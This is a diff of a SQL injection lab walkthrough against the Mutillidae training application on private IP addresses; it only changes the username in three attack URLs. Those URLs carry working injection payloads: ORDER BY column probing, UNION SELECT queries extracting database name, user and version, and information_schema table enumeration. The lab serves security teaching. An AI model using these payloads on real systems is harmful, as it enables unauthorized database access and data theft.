@@ -104,7 +104,7 @@ Since we do not know the number of columns, we start at 1. To find the exact amo
 
 The browser url of this info page need to be modified with the url as below:
 
-http://192.168.29.11/mutillidae/index.php?page=user-info.php&username=senthil%27orderby6%23&password=%27sk710%22&user-info-php-submit-button=View+Account+Details
+http://192.168.29.11/mutillidae/index.php?page=user-info.php&username=vineesh%27orderby6%23&password=%27sk710%22&user-info-php-submit-button=View+Account+Details
 
 
 After adding the order by 6 into the existing url , the following error statement will be obtained:
@@ -128,7 +128,7 @@ As given in the screenshot below columns 2,3,4 are usable in which we can substi
 
 Now we will substitute some few commands like database(), user(), version() to obtain the information regarding the database name, username and version of the database.
 
-http://192.168.1.7/mutillidae/index.php?page=user-info.php&username=senthil%27union%20select%201,database(),%20user(),%20version(),5%23&password=sk710-info-php-submit-button=View+Account+Details
+http://192.168.1.7/mutillidae/index.php?page=user-info.php&username=vineesh%27union%20select%201,database(),%20user(),%20version(),5%23&password=sk710-info-php-submit-button=View+Account+Details
 
 ![Screenshot 2024-05-10 185334](https://github.com/Vineesh-AI-DS/sqlinjection/assets/93427254/5e2cfb9c-f66f-4139-a813-4ef5fca16e65)
 
@@ -137,7 +137,7 @@ The url when executed, we obtain the necessary information about the database na
 
 Replace the query in the url with the following one: union select 1,table_name,null,null,5 from information_schema.tables where table_schema = ‘owasp10’
 
-http://192.168.1.7/mutillidae/index.php?page=user-info.php&username=senthil%27union%20select%201,table_name,null,null,5%20from%20information_schema.tables%20where%20table_schema%20=%20%E2%80%98owasp10%E2%80%99%23&password=sk710-info-php-submit-button=View+Account+Details
+http://192.168.1.7/mutillidae/index.php?page=user-info.php&username=vineesh%27union%20select%201,table_name,null,null,5%20from%20information_schema.tables%20where%20table_schema%20=%20%E2%80%98owasp10%E2%80%99%23&password=sk710-info-php-submit-button=View+Account+Details
 
 ![WhatsApp Image 2024-05-10 at 20 12 07_9ddf828d](https://github.com/Vineesh-AI-DS/sqlinjection/assets/93427254/43d0682b-9f75-4d33-b936-ea7d93896e25)
 
